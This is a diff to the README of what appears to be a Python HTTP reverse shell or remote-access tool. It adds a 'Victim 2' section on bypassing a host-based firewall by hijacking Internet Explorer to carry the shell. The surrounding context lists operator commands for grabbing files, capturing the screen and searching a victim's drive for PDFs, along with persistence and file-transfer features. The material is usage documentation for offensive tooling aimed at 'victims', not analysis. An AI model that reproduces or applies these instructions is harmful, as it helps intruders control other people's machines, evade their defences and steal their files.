@@ -3,7 +3,7 @@
 python3 httpServer.py
 ```
 
-## Victim
+## Victim 1
 - with these options
   - File Transfer
   - Persistence 
@@ -18,6 +18,13 @@ Shell> grab*video.mp4
 Shell> screencap
 Shell> search C:\*.pdf
 ```
+
+## Victim 2 (Bypassing Host Based Firewall)
+Hijacking Internet Explorer - Shell Over Internet Explorer - Server Side is the same as HTTP Reverse Shell
+```
+pip install pywin32
+```
+
 
 ## Notes
 - any interactive commands, will not work in shell such as telnet
